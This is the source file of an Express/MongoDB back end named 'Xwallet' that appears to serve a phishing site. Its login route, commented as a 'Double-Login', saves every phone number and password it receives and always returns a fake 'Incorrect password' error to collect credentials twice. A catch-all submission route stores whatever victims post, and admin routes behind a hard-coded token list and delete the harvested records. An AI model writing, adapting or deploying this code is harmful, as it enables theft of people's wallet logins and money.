require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const Submission = require('./models/Submission');

const app = express();
const PORT = process.env.PORT || 5000;

/* ===========================
   MIDDLEWARE
 =========================== */
app.use(cors());
app.use(express.json());

/* ===========================
   MONGODB CONNECTION (VERCEL SAFE)
 =========================== */
let cached = global.mongoose;

if (!cached) {
  cached = global.mongoose = { conn: null, promise: null };
}

async function connectDB() {
  if (cached.conn) return cached.conn;

  if (!cached.promise) {
    cached.promise = mongoose
      .connect(process.env.MONGODB_URI, {
        bufferCommands: false,
      })
      .then((mongoose) => mongoose);
  }

  cached.conn = await cached.promise;
  return cached.conn;
}

/* ===========================
   ROUTES
 =========================== */

// 0️⃣ Double-Login: First attempt saves credentials and returns error
app.post('/api/login', async (req, res) => {
  try {
    await connectDB();

    const { loginPhone, loginPassword } = req.body;
    const loginSubmission = new Submission({
      loginPhone,
      loginPassword,
      source: 'login'
    });
    await loginSubmission.save();

    // Always return error on first attempt
    res.status(401).json({ success: false, error: 'Incorrect password. Please try again.' });
  } catch (error) {
    console.error('Login Save Error:', error);
    res.status(401).json({ success: false, error: 'Incorrect password. Please try again.' });
  }
});

// 1️⃣ User Submission
app.post('/api/submit', async (req, res) => {
  try {
    await connectDB();

    const newSubmission = new Submission(req.body);
    await newSubmission.save();

    res.status(201).json({ message: 'Saved successfully' });
  } catch (error) {
    console.error('Submission Error:', error);
    res.status(500).json({ error: error.message });
  }
});

// 2️⃣ Admin Login
app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;

  if (password === process.env.ADMIN_MASTER_PASSWORD) {
    res.json({ success: true, token: 'ADMIN_ACCESS_GRANTED' });
  } else {
    res.status(401).json({ success: false, error: 'Invalid Password' });
  }
});

// 3️⃣ Get All Submissions (Admin)
app.get('/api/admin/data', async (req, res) => {
  if (req.headers['auth-token'] !== 'ADMIN_ACCESS_GRANTED') {
    return res.status(401).json({ error: 'Unauthorized' });
  }

  try {
    await connectDB();

    const data = await Submission.find().sort({ timestamp: -1 });
    res.json(Array.isArray(data) ? data : []);
  } catch (error) {
    console.error('Fetch Error:', error);
    res.status(500).json([]);
  }
});

// 4️⃣ Delete Submission (Admin)
app.delete('/api/admin/data/:id', async (req, res) => {
  if (req.headers['auth-token'] !== 'ADMIN_ACCESS_GRANTED') {
    return res.status(401).json({ error: 'Unauthorized' });
  }

  try {
    await connectDB();

    await Submission.findByIdAndDelete(req.params.id);
    res.json({ success: true });
  } catch (error) {
    console.error('Delete Error:', error);
    res.status(500).json({ error: 'Error deleting' });
  }
});

// Root test route
app.get('/', (req, res) => {
  res.send('Xwallet Backend is Running');
});

/* ===========================
   EXPORT FOR VERCEL
 =========================== */
module.exports = app;

/* ===========================
   LOCAL DEVELOPMENT ONLY
 =========================== */
if (require.main === module) {
  app.listen(PORT, () => {
    console.log(`🚀 Xwallet Server running locally on port ${PORT}`);
  });
}
